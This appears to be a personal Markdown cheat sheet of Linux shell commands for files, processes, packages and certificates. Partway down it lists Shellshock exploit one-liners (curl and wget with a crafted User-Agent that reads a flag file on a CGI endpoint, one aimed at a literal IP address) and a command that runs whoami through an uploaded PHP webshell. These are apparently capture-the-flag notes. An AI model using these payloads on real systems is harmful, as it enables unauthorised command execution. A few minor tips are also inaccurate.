# System
* Find out OS name, OS version, and System Type! 
```bash
uname -a
```


# File Manipulation
* Shuffles the lines of a file `-R`: random
```bash
sort -R playlist -o playlist
```

* Shuffles the fast way (ONLY WORKS with file that has run permission)
```bash
shuf FILE -o FILE
```

* Print a file in reverse with `tac`
```bash
cat file | tac
```

* Print the hexdump of a file in reverse
```bash
xxd -p -c1 file | tac | xxd -r > file.out
```

* Find the common and unique lines in two files with `comm`
```bash
comm file1 file2
```

* `diff -u` shows the comparison result of two files in a unified way, `-` shows the line unique to file1, `+` shows the line unique to file2
```bash
diff -u file1 file2
```

* Convert Chinese unreadable filename to correct filename (AWESOME)
```bash
7z x -scs903 ZIPFILE.zip
```

* Install Chinese font
```bash
sudo apt install fonts-wqy-microhei
sudo apt install fonts-wqy-zenhei
```

* Install Chinese pinyin input
```bash
sudo apt-get install ibus-pinyin
ibus restart
```

* Insert a newline at a specific line with sed `-i` `[--in-place]`
```bash
sed -i '$LINE_NUMi \n' foo.txt 
```

* Remove line with fewer than `N` of characters in place with sed
```bash
sed -r '/^.{,N}$/d' FILE.txt -i.bak
```

* Remove lines with non-ascii characters
```bash
perl -nle 'print if m{^[[:ascii:]]+$}' FILE > NEW_FILE
mv NEW_FILE FILE
```

* Getting all the line with only alphanumeric characters
```bash
perl -nle 'print if m{^[[:alnum:]]+$}' FILE > NEW_FILE
```

* Read all files in a directory line by line (USE THE NEXT ONE if needed)
```bash
ls | while read f; do while read -r line; do echo $line; done < $f ; done
```

* Copy an entire directory to another directory; `-r` = `-R`
```bash
cp -R source dest
```

* Duplicate a content of a file
```bash
cat FILE | tee -a FILE > /dev/null
```

* Get the size of a directory with `du`, disk usage, `-s` (summary) `-h` human readable
```bash
du -sh 
```

* Get the size of each folder in the current dicretory
```bash
du -ch --max-depth=1 .
```

* Get the size of free space with `df`, disk free, `-h` human readable in `1024` power, `-H` in `1000` power
```bash
df -h 
```

* Get details of a directory `-h` human readable, `-a` show hidden, `-l` print details, `-s` sort by date
```bash
ls -halt
```

* Save the output of a command to a variable
```bash
cwd=$(pwd)
```

* `zip` a directory
```bash
zip -r FILE.zip DIR
```

* Run a process in the background using `&` (`-c` : create a new archive; `-x` : extract; `-z` : gunzip; `-f` : Specify a file)
```bash
tar -cxzf file.tar.gz . &
```

* Check current running processes
```bash
jobs
```
```bash
ps
```

* Resume a paused running process with `fg %[number]` , e.g., `fg %2` resumes the second paused job
```bash
fg %2
```

* Retrieve the first word from stdout using `awk` and `cut`
```bash
echo "hello world" | awk '{print $1;}'
```
```bash
echo "hello world" | cut -f 1 -d " "
```

* Use nohup to enable a process to continue running in the background when a user exits shell (DETACH FULLY)
```bash
nohup tar -czf file.tar.gz &
```

* Does the above without creating nohup.out 
```bash
nohup COMMAND >/dev/null 2>&1 &
```

* Copy a file content to system clipboard
```bash
xclip -sel clip < FILE
|
cat data.txt | xclip -selection c
```

* Information of process `ps`, `-e` or `-A`  list all process, `-f` do full format listing, include arguments with the command.
```bash
ps -eaf
```

* `-C` find the process id using the command name
```bash
ps -fC vim
```

* kill a process with `ps`
```bash
ps -eaf | grep vim
kill 1337
```
```bash
kill $(ps | grep play | awk '{print $1;}')
```

* Process Enumeration, `a` is list all process with terminal(`tty`), `ax` list all process with/without a `tty`, lifts the restriction of needing a `tty`, `u` is user readable format
```bash
ps aux
```

* kill a process with `pkill` (MUCH EASIER :D)
```bash
pkill vim
```

* kill a background process
```bash
jobs
kill %1
```

* kill all running instance of a program, when you have created many forks
```bash
killall python
```

* Check if a state of a process is paused or not, if it is then continue
```bash
if [ "$(ps -o state= -p $PID)" = T ]; then
	kill -CONT $PID
fi
```

* Unzip a tarball
```bash
tar xf FILE.tar.xz
tar xfz FILE.tar.gz
```

* Change directory to the output of a command
```bash
cd "$(dirname "$(which COMMAND)" )"
```

* Change directory to the previous directory!
```bash
cd ${cd -}
```
```
cd $OLDPWD
```

* Install `.deb` packages with `dpkg`, which is also used by `apt`, and does not require internet access
```bash
dpkg -i file.deb
```

* Install `.deb` with `apt`!! How did I not know this before??
```bash
sudo apt install ./file.deb
```

* Extract `.deb` packages
```bash
dpkg -e file.deb
```

* Install / open `.rpm` files
```bash
sudo apt install rpm2cpio
rpm2cpio /path-to-file.rpm | cpio -i --make-directories
```

* `7z` is officially weird... the arguments it take have to be right afterwards...
```bash
7z x ZIP.zip -oEXTRACTED
```

* `grip`. Using grip to build markdown files locally. `-b`: opens up a browser tab. (Need to install a repo)
```bash
grip -b FILE.md
```

* Reading certain types of file line by line with `find`
```bash
for file in $(find . -type f -name "*.txt")
do
cat $file
done
```
## Misc
* Get number of second since `epoch`
```bash
date +%s 
```

* Time a command
```bash
time bash
```

* Date format string to display
```bash
%a %m/%d %R:%S
```

## Redirection
`ls DIR > dirlist`
`>` Redirects output
`>>` Appends output to an existing file
`<` Takes in input
`>&` Redirects output of one file to another, e.g. `2>&1` redirects error to output (pre bash 4.0)
`&>>` does the above in post Bash 4.0 and apending it to a file
`&>` does the above but overwrites the target file

* File descriptors: 

| value | name   |
|:-----:|:------:|
| 0     | stdin  |
| 1     | stdout |
| 2     | stderr |

* Check architecture
```bash
dpkg --print-architecture
```

* Check OS version
```bash
lsb_release -a
```

* Change computer name / hostname
```bash
sudo hostname NEW_HOST_NAME
```

* Getting the current directory name in a cool way, it can be VERY USEFUL!
```bash
basename $PWD
```

* List all the graphics card, `-nn` Show PCI vendor and device codes, `-v` verbose.
```bash
lspci -vnn | grep VGA -A 12
```
* Show CPU info
```bash
lscpu
```
* Show USB info, to determine the version of USB a flash drive is using, `-D` list devices.
```bash
lsusb
lsusb -D /dev/bus/usb/003/023
```

* Copy to a target directory and make the directory if it does not exist. `mkdir`, `-p` creates all directories
```
mkdir -p PATH && cp FILE PATH
```

* Make multiple directories wiht `-p`, braces expansion
```
mkdir -p test/{dir1,dir2,dir3}
```

* List of pip environments
```bash
pip freeze
```

* Install all pip environment recursively 
```bash
pip install -r requirements.txt
```

* List all the all current directories
```bash
ls -d */
echo */
ls -l | grep "^d"
ll | grep "^d"
for i in $(ls -d */); do echo ${i%%/}; done
```

* Shellshock with `wget`
```bash
wget localhost:10702/cgi-bin/board -U "() { :;  }; echo 'Content-Type: text/plain'; echo ; /bin/cat /proc/flag"
```

* Shellshock with `curl`
```bash
curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/cat /proc/flag"
```

* Shellshock with `curl` by using `/bin/bash`
```bash
curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/bash -c "/bin/cat flag"
```

* Using `curl` to access a webshell, `-k` is for insecure connection. By default `curl` verifies every `SSL` connection.
```bash
curl -k https://127.0.0.1/uploads/shell.php?cmd=whoami
```

* Recursively change the owner and group of a directory
```bash
sudo chown -R saccharide:saccharide DIR/
```
    
## Adding root certificate to OS
* Adding certificate to `/urs/share/ca-certificate`
```bash
sudo cp certificate.crt /usr/share/ca-certificate/
sudo dpkg-reconfigure ca-certificates
sudo update-ca-certificates
```

* On Linux, Chromium uses the NSS (Network Security Services) Shared Database. NSS is a set of libraries designed to support cross-platform development of security-enabled client and server application. So to add a certificate to the NSS database, we can do the following: 
```bash
certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n <certificate nickname> -i <certificate filename>
```

* Listing details of the certificate in the NSS database
```bash
certutil -d sql:$HOME/.pki/nssdb -L -n <certificate nickname>
```
## Environment Variable
* Add environment variable
```bash
export REMOTE=1
```
* Remove or unset an environment variable
```bash
unset REMOTE
```

# root
* Login in as root with `sudo`, `-s` is short for shell, which makes a lot of sense
```bash
sudo -s
```
* Go into root shell with `sudo`
```bash
sudo -i
```

# Fixing the problem of could not get lock /var/lib/dpkg/lock
```
sudo dpkg --configure -a
```

# APT Update and Upgrade
* `apt` is a full blown package manager, and will recursively resolve any dependency when installing a package.
* It stores a locally cached database of the avialble applications in the current OS to speed up the installing process.
* `apt update` is to update this locally cached database
* After updating this database with previous command, we can use `apt upgrade` to upgrade all currently installed packages to their latest verisons.


## cron
* The Linux based job scheduler is called `cron`, and is separated into `cron.hourly`, `cron.daily`, `cron.weekly`, `cron.monthly` under `/etc/`.
* We can add our own scheduled task to be run in `/etc/crontab`. 
